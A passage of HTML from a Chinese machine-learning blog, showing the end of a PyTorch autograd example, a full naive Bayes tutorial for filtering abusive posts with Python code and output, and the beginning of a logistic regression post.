反向传播中，我们接收一个Tensor包含loss对于输出的梯度，需要计算loss对于输入的梯度</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">input</span>, = ctx.saved_tensors</span><br><span class="line">        grad_input = grad_output.clone()</span><br><span class="line">        grad_input[<span class="built_in">input</span> &lt; <span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> grad_input</span><br><span class="line"></span><br><span class="line">dtype = torch.<span class="built_in">float</span></span><br><span class="line"></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x = torch.randn(N, D_in, dtype=dtype)</span><br><span class="line">y = torch.randn(N, D_out, dtype=dtype)</span><br><span class="line"></span><br><span class="line">w1 = torch.randn(D_in, H, dtype=dtype, requires_grad=<span class="literal">True</span>)</span><br><span class="line">w2 = torch.randn(H, D_out, dtype=dtype, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">learning_rate = <span class="number">1e-6</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    relu = MyReLU.apply</span><br><span class="line"></span><br><span class="line">    y_pred = relu(x.mm(w1)).mm(w2)</span><br><span class="line">    <span class="comment"># loss是一个shape(1,)的Tensor</span></span><br><span class="line">    loss = (y_pred - y).<span class="built_in">pow</span>(<span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">    <span class="comment"># print t, loss.item()</span></span><br><span class="line">    loss.backward()</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        w1 -= learning_rate * w1.grad</span><br><span class="line">        w2 -= learning_rate * w2.grad</span><br><span class="line">        <span class="comment"># 在更新weight后，手动将梯度归零</span></span><br><span class="line">        w1.grad.zero_()</span><br><span class="line">        w2.grad.zero_()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/24/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/24/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/" class="post-title-link" itemprop="url">朴素贝叶斯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-24 14:42:42" itemprop="dateCreated datePublished" datetime="2018-05-24T14:42:42+08:00">2018-05-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="基于贝叶斯决策理论的分类方法"><a href="#基于贝叶斯决策理论的分类方法" class="headerlink" title="基于贝叶斯决策理论的分类方法"></a>基于贝叶斯决策理论的分类方法</h2><p> 朴素贝叶斯是贝叶斯决策理论的一部分，所以在学习朴素贝叶斯之前先了解一下贝叶斯决策理论。<br> 假设我们有一个数据集，由两类数据组成：<br> <img src="/images/machinelearning/dataset.png" alt="两个参数已知的概率分布，参数决定了分布的形状"><br>假设已知图中两类数据的统计参数。我们现在用p1(x, y)表示数据点(x, y)属于类别1的概率，用p2(x, y)表示数据点(x, y)数据类别2的概率，那么对于一个新数据点(x, y)，可以用下面的规则判断它的类别：  </p>
<ul>
<li>如果p1(x, y) &gt; p2(x, y)，那么类别为1。</li>
<li>如果p2(x, y) &gt; p1(x, y)，那么类别为2。</li>
</ul>
<p>我们会选择高概率对应的类别，这就是贝叶斯决策理论的核心思想，即选择具有最高概率的决策。<br>但这两个准则并不是贝叶斯决策理论的所有内容，p1()和p2()是为了简化描述，而真正需要比较的是$p(c_1|x, y)$和$p(c_2|x, y)$。这些符号的具体意义是：给定某个由x、y表示的数据点，那么该数据点来自类别$c_1$和$c_2$的概率。<br>如果已知概率$p(x, y|c_1)$，可以使用贝叶斯准则来交换概率中的条件与结果：<br>$$<br>p(c_i|x, y) = \frac{p(x, y|c_i)p(c_i)}{p(x, y)}<br>$$</p>
<h2 id="使用朴素贝叶斯进行文档分类"><a href="#使用朴素贝叶斯进行文档分类" class="headerlink" title="使用朴素贝叶斯进行文档分类"></a>使用朴素贝叶斯进行文档分类</h2><p>朴素贝叶斯的一个假设是样本的特征之间相互<code>独立</code>，即一个特征或者单词出现的可能性与它和其他单词相邻没有关系。当然，这种假设不正确，这个假设正是朴素贝叶斯分类器中<code>朴素</code>的含义。朴素贝叶斯分类器的另一个假设是，每个特征同等重要。其实这个假设也有问题，尽管上述假设存在一些小瑕疵，但朴素贝叶斯的实际效果却很好。<br>现在我们要维护一个在线社区留言板，为了不影响社区的发展，我们要屏蔽侮辱性言论，对此问题建立两个类别，侮辱类和非侮辱类，使用1和0分别表示。  </p>
<h3 id="准备数据：从文本中构建词向量"><a href="#准备数据：从文本中构建词向量" class="headerlink" title="准备数据：从文本中构建词向量"></a>准备数据：从文本中构建词向量</h3><p>下面我们将先建立词汇表，然后将每一篇文档转换为词汇表上的向量：<br><strong>代码清单</strong> bayes.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadDataSet</span>():</span></span><br><span class="line">    postingList = [[<span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;has&#x27;</span>, <span class="string">&#x27;flea&#x27;</span>, <span class="string">&#x27;problems&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;please&#x27;</span>],</span><br><span class="line">            [<span class="string">&#x27;maybe&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;take&#x27;</span>, <span class="string">&#x27;him&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;park&#x27;</span>, <span class="string">&#x27;stupid&#x27;</span>],</span><br><span class="line">            [<span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;dalmation&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;so&#x27;</span>, <span class="string">&#x27;cute&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;love&#x27;</span>, <span class="string">&#x27;him&#x27;</span>],</span><br><span class="line">            [<span class="string">&#x27;stop&#x27;</span>, <span class="string">&#x27;posting&#x27;</span>, <span class="string">&#x27;stupid&#x27;</span>, <span class="string">&#x27;worthless&#x27;</span>, <span class="string">&#x27;garbage&#x27;</span>],</span><br><span class="line">            [<span class="string">&#x27;mr&#x27;</span>, <span class="string">&#x27;licks&#x27;</span>, <span class="string">&#x27;ate&#x27;</span>, <span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;steak&#x27;</span>, <span class="string">&#x27;how&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;stop&#x27;</span>, <span class="string">&#x27;him&#x27;</span>],</span><br><span class="line">            [<span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;buying&#x27;</span>, <span class="string">&#x27;worthless&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;food&#x27;</span>, <span class="string">&#x27;stupid&#x27;</span>]] <span class="comment"># 列表中的每个列表表示一篇文档</span></span><br><span class="line">    classVec = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>] <span class="comment"># 1表示侮辱性文字，0代表正常言论</span></span><br><span class="line">    <span class="keyword">return</span> postingList, classVec</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createVocabList</span>(<span class="params">dataSet</span>):</span></span><br><span class="line">    vocabSet = <span class="built_in">set</span>([])</span><br><span class="line">    <span class="keyword">for</span> document <span class="keyword">in</span> dataSet:</span><br><span class="line">        vocabSet = vocabSet | <span class="built_in">set</span>(document)</span><br><span class="line">    <span class="comment"># 返回不重复词列表，即词汇表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(vocabSet)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setOfWords2Vec</span>(<span class="params">vocabList, inputSet</span>):</span></span><br><span class="line">    returnVec = [<span class="number">0</span>]*<span class="built_in">len</span>(vocabList) <span class="comment"># 建立一个词汇表长度的0列表</span></span><br><span class="line">    <span class="comment"># 将输入的文档转换为词汇表上的向量</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> inputSet:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> vocabList:</span><br><span class="line">            returnVec[vocabList.index(word)] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="built_in">print</span> <span class="string">&quot;the word: %s is not in my Vocabulary!&quot;</span> % word</span><br><span class="line">    <span class="keyword">return</span> returnVec</span><br><span class="line"></span><br><span class="line">listOPosts, listClasses = loadDataSet()</span><br><span class="line">myVocabList = createVocabList(listOPosts)</span><br><span class="line"><span class="built_in">print</span> myVocabList</span><br><span class="line"><span class="built_in">print</span> setOfWords2Vec(myVocabList, listOPosts[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python bayes.py</span><br><span class="line">[&#39;cute&#39;, &#39;love&#39;, &#39;help&#39;, &#39;garbage&#39;, &#39;quit&#39;, &#39;I&#39;, &#39;problems&#39;, &#39;is&#39;, &#39;park&#39;, &#39;stop&#39;, &#39;flea&#39;, &#39;dalmation&#39;, &#39;licks&#39;, &#39;food&#39;, &#39;not&#39;, &#39;him&#39;, &#39;buying&#39;, &#39;posting&#39;, &#39;has&#39;, &#39;worthless&#39;, &#39;ate&#39;, &#39;to&#39;, &#39;maybe&#39;, &#39;please&#39;, &#39;dog&#39;, &#39;how&#39;, &#39;stupid&#39;, &#39;so&#39;, &#39;take&#39;, &#39;mr&#39;, &#39;steak&#39;, &#39;my&#39;]</span><br><span class="line">[0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1]</span><br></pre></td></tr></table></figure>

<h3 id="训练算法：从词向量计算概率"><a href="#训练算法：从词向量计算概率" class="headerlink" title="训练算法：从词向量计算概率"></a>训练算法：从词向量计算概率</h3><p>重写贝叶斯准则，将之前的x、y替换为$\boldsymbol{w}$。$\boldsymbol{w}$表示一个向量，由多个数值组成，这里数值个数即词汇表中的词个数。所要求的概率即为：<br>$$<br>p(c_i|\boldsymbol{w}) = \frac{p(\boldsymbol{w}|c_i)p(c_i)}{p(\boldsymbol{w})}<br>$$<br>$p(c_i)$可以用类别i的文档数除以总的文档数求得。$p(\boldsymbol{w}|c_i)$的计算就要用到朴素贝叶斯假设了，假设所有词相互独立，将$\boldsymbol{w}$展开为一个个独立特征$p(w_0, w_1, w_2..w_n|c_i)$，它可以使用$p(w_0|c_i)p(w_1|c_i)p(w_2|c_i)…p(w_N|c_i)$来计算。<br>在bayes.py文件中继续添加代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trainNB0</span>(<span class="params">trainMatrix, trainCategory</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    trainMatrix: 文档转换成的词汇表向量</span></span><br><span class="line"><span class="string">    trainCategory: 文档的分类标签</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    numTrainDocs = <span class="built_in">len</span>(trainMatrix) <span class="comment"># 文档数6</span></span><br><span class="line">    numWords = <span class="built_in">len</span>(trainMatrix[<span class="number">0</span>]) <span class="comment"># 词汇表长度32</span></span><br><span class="line">    pAbusive = <span class="built_in">sum</span>(trainCategory)/<span class="built_in">float</span>(numTrainDocs) <span class="comment"># 侮辱性文档概率0.5</span></span><br><span class="line">    p0Num = zeros(numWords); p1Num = zeros(numWords) <span class="comment"># 分子向量</span></span><br><span class="line">    p0Denom = <span class="number">0.0</span>; p1Denom = <span class="number">0.0</span> <span class="comment"># 分母</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTrainDocs):</span><br><span class="line">        <span class="keyword">if</span> trainCategory[i] == <span class="number">1</span>: <span class="comment"># 侮辱性文档</span></span><br><span class="line">            p1Num += trainMatrix[i] <span class="comment"># 向量相加，每个词出现的次数（numpy的array加列表，自动转换为array）</span></span><br><span class="line">            p1Denom += <span class="built_in">sum</span>(trainMatrix[i]) <span class="comment"># 出现的所有词的个数</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p0Num += trainMatrix[i]</span><br><span class="line">            p0Denom += <span class="built_in">sum</span>(trainMatrix[i])</span><br><span class="line">    p1Vect = p1Num/p1Denom <span class="comment"># 在侮辱性文档中，每个词出现的概率</span></span><br><span class="line">    p0Vect = p0Num/p0Denom</span><br><span class="line">    <span class="keyword">return</span> p0Vect, p1Vect, pAbusive</span><br><span class="line">    </span><br><span class="line">listOPosts, listClasses = loadDataSet()</span><br><span class="line">myVocabList = createVocabList(listOPosts)</span><br><span class="line">trainMat = []</span><br><span class="line"><span class="keyword">for</span> postinDoc <span class="keyword">in</span> listOPosts:</span><br><span class="line">    trainMat.append(setOfWords2Vec(myVocabList, postinDoc))</span><br><span class="line"></span><br><span class="line">p0V, p1V, pAb = trainNB0(trainMat, listClasses)</span><br><span class="line"><span class="built_in">print</span> p0V</span><br><span class="line"><span class="built_in">print</span> p1V</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python bayes.py</span><br><span class="line">[0.04166667 0.04166667 0.04166667 0.         0.         0.04166667</span><br><span class="line"> 0.04166667 0.04166667 0.         0.04166667 0.04166667 0.04166667</span><br><span class="line"> 0.04166667 0.         0.         0.08333333 0.         0.</span><br><span class="line"> 0.04166667 0.         0.04166667 0.04166667 0.         0.04166667</span><br><span class="line"> 0.04166667 0.04166667 0.         0.04166667 0.         0.04166667</span><br><span class="line"> 0.04166667 0.125     ]</span><br><span class="line">[0.         0.         0.         0.05263158 0.05263158 0.</span><br><span class="line"> 0.         0.         0.05263158 0.05263158 0.         0.</span><br><span class="line"> 0.         0.05263158 0.05263158 0.05263158 0.05263158 0.05263158</span><br><span class="line"> 0.         0.10526316 0.         0.05263158 0.05263158 0.</span><br><span class="line"> 0.10526316 0.         0.15789474 0.         0.05263158 0.</span><br><span class="line"> 0.         0.        ]</span><br></pre></td></tr></table></figure>

<h3 id="测试算法：根据现实情况修改分类器"><a href="#测试算法：根据现实情况修改分类器" class="headerlink" title="测试算法：根据现实情况修改分类器"></a>测试算法：根据现实情况修改分类器</h3><p>要计算多个概率的乘积以获得文档属于某个类别的概率，即计算$p(w_0|1)p(w_1|1)p(w_2|1)…$。如果其中一个概率为0，那么最后的乘积也为0，为消除这种影响，将所有词的出现数初始化为1，并将分母初始化为2。<br>修改bayes.py中trainNB0()：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p0Num = ones(numWords); p1Num = ones(numWords)</span><br><span class="line">p0Denom = <span class="number">2.0</span>; p1Denom = <span class="number">2.0</span></span><br></pre></td></tr></table></figure>
<p>另一个遇到的问题是下溢，这是由于太多很小的数相乘造成的。当计算乘积$p(w_0|c_i)p(w_1|c_i)p(w_2|c_i)…p(w_N|c_i)$时，由于大部分因子都非常小，所以程序会下溢，一种解决办法是对乘积取自然对数。在代数中有$ln(a*b) = ln(a)+ln(b)$，修改return前的两行代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1Vect = log(p1Num/p1Denom)</span><br><span class="line">p0Vect = log(p0Num/p0Denom)</span><br></pre></td></tr></table></figure>
<p>下面将分类函数添加到bayes.py中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classifyNB</span>(<span class="params">vec2Classify, p0Vec, p1Vec, pClass1</span>):</span></span><br><span class="line">    p1 = <span class="built_in">sum</span>(vec2Classify * p1Vec) + log(pClass1) <span class="comment"># 向量相乘的和</span></span><br><span class="line">    p0 = <span class="built_in">sum</span>(vec2Classify * p0Vec) + log(<span class="number">1.0</span> - pClass1)</span><br><span class="line">    <span class="keyword">if</span> p1 &gt; p0:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testingNB</span>():</span></span><br><span class="line">    listOPosts, listClasses = loadDataSet()</span><br><span class="line">    myVocabList = createVocabList(listOPosts)</span><br><span class="line">    trainMat = []</span><br><span class="line">    <span class="keyword">for</span> postinDoc <span class="keyword">in</span> listOPosts:</span><br><span class="line">        trainMat.append(setOfWords2Vec(myVocabList, postinDoc))</span><br><span class="line"></span><br><span class="line">    p0V, p1V, pAb = trainNB0(trainMat, listClasses)</span><br><span class="line">    testEntry = [<span class="string">&#x27;love&#x27;</span>, <span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;dalmation&#x27;</span>]</span><br><span class="line">    thisDoc = setOfWords2Vec(myVocabList, testEntry)</span><br><span class="line">    <span class="built_in">print</span> testEntry, <span class="string">&#x27;classified as: &#x27;</span>, classifyNB(thisDoc, p0V, p1V, pAb)</span><br><span class="line">    </span><br><span class="line">    testEntry = [<span class="string">&#x27;stupid&#x27;</span>, <span class="string">&#x27;garbage&#x27;</span>]</span><br><span class="line">    thisDoc = setOfWords2Vec(myVocabList, testEntry)</span><br><span class="line">    <span class="built_in">print</span> testEntry, <span class="string">&#x27;classified as: &#x27;</span>, classifyNB(thisDoc, p0V, p1V, pAb)</span><br><span class="line"></span><br><span class="line">testingNB()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python bayes.py</span><br><span class="line">[&#39;love&#39;, &#39;my&#39;, &#39;dalmation&#39;] classified as:  0</span><br><span class="line">[&#39;stupid&#39;, &#39;garbage&#39;] classified as:  1</span><br></pre></td></tr></table></figure>
<p><strong>条件概率</strong><br>$$<br>P(A|B) = \frac{P(AB)}{P(B)}<br>$$<br><strong>贝叶斯准则</strong><br>$$<br>p(c|x) = \frac{p(x|c)p(c)}{p(x)}<br>$$<br><strong>reference</strong><br>《机器学习实战》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/23/Logistic%E5%9B%9E%E5%BD%92/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/23/Logistic%E5%9B%9E%E5%BD%92/" class="post-title-link" itemprop="url">Logistic回归</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-23 17:41:43" itemprop="dateCreated datePublished" datetime="2018-05-23T17:41:43+08:00">2018-05-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我们需要一个函数能接受所有的输入然后预测出类别，例如在两个类的情况下，这个函数输出0或1。单位阶跃函数具有这种性质，然而它的问题在于在跳跃点上从0瞬间跳跃到1，这个瞬间跳跃过程有时很难处理。幸好另一个函数也有类似性质，且数学上更易处理，这就是sigmoid函数。</p>
<h2 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h2><p>sigmoid函数的具体计算公式如下：</p>
<p>$$<br>y = \frac{1}{1+e^{-z}}<br>$$<br>该函数的定义域为$(-\infty\to+\infty)$，值域为$(0, 1)$。下图是sigmoid函数的图像：<br><img src="/images/machinelearning/Logistic.png"><br>当x为0时，sigmoid函数值为0.5，随着x的增大，对应的sigmoid值将逼近于1；而随着x的减小，sigmoid值将逼近于0。  </p>
<h2 id="逻辑回归（logistic-regression）"><a href="#逻辑回归（logistic-regression）" class="headerlink" title="逻辑回归（logistic regression）"></a>逻辑回归（logistic regression）</h2><p>逻辑回归虽然名字里有回归，但实际是一种分类方法，主要用于二分类问题。生活中经常会遇到二分类问题。例如，某封电子邮件是否为垃圾邮件，某个客户是否为潜在客户，某次在线交易是否存在欺诈行为等。<br>为了实现Logistic回归分类器，我们可以在每个特征上都乘以一个回归系数，然后把所有的结果值相加，将这个总和代入sigmoid函数中，进而得到一个范围在0~1之间的数值。任何大于0.5的数据被分入1类，小于0.5即被归入0类。<br>令$z=\boldsymbol{w^Tx}+b=w_0x_0+w_1x_1+…+w_nx_n+b$，代入sigmoid函数</p>
<p>$$<br>y=\frac{1}{1+e^{-(\boldsymbol{w^Tx}+b)}}<br>$$<br>确定了分类器的函数形式之后，接下来要做的就是求最佳回归系数了，需要用到一些最优化算法。<br>下面是用Python实现的逻辑回归，<a target="_blank" rel="noopener" href="https://github.com/fanrong1992/ml-learning/tree/master/logistic-regression">代码和数据</a>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">training_sample = <span class="string">&#x27;Logistic_Regression-trainingSample.txt&#x27;</span></span><br><span class="line">testing_sample = <span class="string">&#x27;Logistic_Regression-testingSample.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读入训练样本的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadDataSet</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    dataMat = []</span><br><span class="line">    labelMat = []</span><br><span class="line">    f = <span class="built_in">open</span>(filepath)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        lineArr = line.strip().split()</span><br><span class="line">        <span class="comment"># 三个特征x0, x1, x2, x0=1</span></span><br><span class="line">        dataMat.append([<span class="number">1.0</span>, <span class="built_in">float</span>(lineArr[<span class="number">0</span>]), <span class="built_in">float</span>(lineArr[<span class="number">1</span>])])</span><br><span class="line">        labelMat.append(<span class="built_in">int</span>(lineArr[<span class="number">2</span>]))  <span class="comment"># 样本标签y</span></span><br><span class="line">    <span class="keyword">return</span> dataMat, labelMat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1.0</span>/(<span class="number">1</span>+np.exp(-X))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 梯度下降法求回归系数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradAscent</span>(<span class="params">dataMatIn, classLabels</span>):</span></span><br><span class="line">    dataMatrix = np.mat(dataMatIn)             <span class="comment"># 转换成numpy中的矩阵, X, 90 x 3</span></span><br><span class="line">    labelMat = np.mat(classLabels).transpose()  <span class="comment"># 转换成numpy中的矩阵, y, 90 x 1</span></span><br><span class="line">    m, n = np.shape(dataMatrix)  <span class="comment"># m=90, n=3</span></span><br><span class="line">    lr = <span class="number">0.001</span>  <span class="comment"># 学习率</span></span><br><span class="line">    maxCycles = <span class="number">1000</span></span><br><span class="line">    weights = np.ones((n, <span class="number">1</span>))  <span class="comment"># 初始参数, 3 x 1</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(maxCycles):              <span class="comment"># heavy on matrix operations</span></span><br><span class="line">        h = sigmoid(dataMatrix * weights)     <span class="comment"># 模型预测值, 90 x 1</span></span><br><span class="line">        error = h - labelMat              <span class="comment"># 真实值与预测值之间的误差, 90 x 1</span></span><br><span class="line">        temp = dataMatrix.transpose() * error  <span class="comment"># 所有参数的偏导数, 3 x 